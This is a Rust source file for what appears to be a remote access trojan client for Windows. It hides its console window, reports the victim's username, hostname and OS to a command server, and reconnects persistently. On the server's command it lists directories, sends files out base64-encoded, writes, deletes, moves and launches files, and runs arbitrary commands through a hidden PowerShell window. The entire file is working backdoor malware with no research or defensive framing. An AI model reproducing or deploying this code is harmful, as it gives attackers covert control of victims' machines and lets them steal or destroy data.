#![windows_subsystem = "windows"]

use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::time::Duration;
use std::error::Error;
use uuid::Uuid;
use sysinfo::{System, SystemExt};
use std::process::Command;
use std::fs;
use base64::{encode, decode};
use serde_json::json;

const DELIMITER: u8 = b'\0';
const RECONNECT_DELAY: u64 = 5; // seconds

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    run_client().await
}

async fn run_client() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:7880";
    let client_id = Uuid::new_v4().to_string();
    let system = System::new_all();
    let os_name = system.name().unwrap_or_else(|| "Unknown".to_string());
    let info = format!(
        "INFO:{}|{}|{}|{}",
        std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string()),
        hostname::get()?.to_string_lossy(),
        client_id,
        os_name
    );

    loop {
        match TcpStream::connect(server_addr).await {
            Ok(stream) => {
                let (reader, mut writer) = stream.into_split();
                let mut reader = BufReader::new(reader);

                writer.write_all(info.as_bytes()).await?;
                writer.write_u8(DELIMITER).await?;
                writer.flush().await?;

                let mut buffer = Vec::new();
                loop {
                    match reader.read_until(DELIMITER, &mut buffer).await {
                        Ok(0) => break, // Server closed the connection
                        Ok(_) => {
                            if let Ok(command) = String::from_utf8(buffer[..buffer.len() - 1].to_vec()) {
                                let output = execute_command(&command);
                                let response = format!("{}:{}", client_id, output);
                                writer.write_all(response.as_bytes()).await?;
                                writer.write_u8(DELIMITER).await?;
                                writer.flush().await?;
                            }
                            buffer.clear();
                        }
                        Err(_) => break,
                    }
                }
            }
            Err(_) => {
                
            }
        }

        tokio::time::sleep(Duration::from_secs(RECONNECT_DELAY)).await;
    }
}

fn execute_command(command: &str) -> String {
    if command.starts_with("LIST_DIR:") {
        list_directory(&command[9..])
    } else if command.starts_with("DOWNLOAD:") {
        download_file(&command[9..])
    } else if command.starts_with("UPLOAD:") {
        let parts: Vec<&str> = command[7..].splitn(2, ':').collect();
        if parts.len() == 2 {
            upload_file(parts[0], parts[1])
        } else {
            "Invalid upload command format".to_string()
        }
    } else if command.starts_with("DELETE:") {
        delete_file(&command[7..])
    } else if command.starts_with("RENAME:") {
        let parts: Vec<&str> = command[7..].splitn(2, ':').collect();
        if parts.len() == 2 {
            rename_file(parts[0], parts[1])
        } else {
            "Invalid rename command format".to_string()
        }
    } else if command.starts_with("CREATE_FOLDER:") {
        create_folder(&command[14..])
    } else if command.starts_with("MOVE:") {
        let parts: Vec<&str> = command[5..].splitn(2, ':').collect();
        if parts.len() == 2 {
            move_file(parts[0], parts[1])
        } else {
            "Invalid move command format".to_string()
        }
    } else if command.starts_with("RUN:") {
        run_file(&command[4..])
    } else {
        execute_shell_command(command)
    }
}

fn list_directory(path: &str) -> String {
    match fs::read_dir(path) {
        Ok(entries) => {
            let files: Vec<_> = entries
                .filter_map(|entry| entry.ok())
                .map(|entry| {
                    let metadata = entry.metadata().unwrap();
                    let full_path = entry.path();
                    json!({
                        "Name": full_path.file_name().unwrap_or_default().to_string_lossy().to_string(),
                        "FullPath": full_path.to_string_lossy().to_string(),
                        "LastWriteTime": metadata.modified().ok().and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok()).map(|d| d.as_secs()).unwrap_or(0),
                        "Length": metadata.len(),
                        "Attributes": if metadata.is_dir() { "Directory" } else { "File" }
                    })
                })
                .collect();
            let json_string = serde_json::to_string(&files).unwrap_or_else(|e| format!("Error serializing JSON: {}", e));
            format!("FILE_LIST:{}", json_string)
        }
        Err(e) => format!("ERROR:Error listing directory: {}", e),
    }
}

fn download_file(file_path: &str) -> String {
    match fs::read(file_path) {
        Ok(content) => {
            let encoded = encode(&content);
            let file_name = std::path::Path::new(file_path).file_name().unwrap().to_string_lossy();
            format!("FILE_CONTENT:{}:{}", file_name, encoded)
        }
        Err(e) => format!("Error reading file: {}", e),
    }
}

fn upload_file(file_path: &str, content: &str) -> String {
    match decode(content) {
        Ok(decoded) => {
            match fs::write(file_path, decoded) {
                Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File uploaded successfully"})),
                Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Error writing file: {}", e)})),
            }
        }
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Error decoding file content: {}", e)})),
    }
}

fn delete_file(path: &str) -> String {
    let result = if std::path::Path::new(path).is_dir() {
        fs::remove_dir_all(path)
    } else {
        fs::remove_file(path)
    };

    match result {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder deleted successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to delete: {}", e)})),
    }
}

fn rename_file(old_path: &str, new_path: &str) -> String {
    match fs::rename(old_path, new_path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder renamed successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to rename: {}", e)})),
    }
}

fn create_folder(path: &str) -> String {
    match fs::create_dir(path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "Folder created successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to create folder: {}", e)})),
    }
}

fn move_file(old_path: &str, new_path: &str) -> String {
    match fs::rename(old_path, new_path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder moved successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to move: {}", e)})),
    }
}

fn run_file(file_path: &str) -> String {
    match std::process::Command::new(file_path).spawn() {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File executed successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to execute file: {}", e)})),
    }
}

fn execute_shell_command(command: &str) -> String {
    match Command::new("powershell")
        .args(&[
            "-WindowStyle",
            "Hidden",
            "-Command",
            command,
        ])
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if stderr.is_empty() {
                stdout.to_string()
            } else {
                format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
            }
        }
        Err(e) => format!("Failed to execute command: {}", e),
    }
}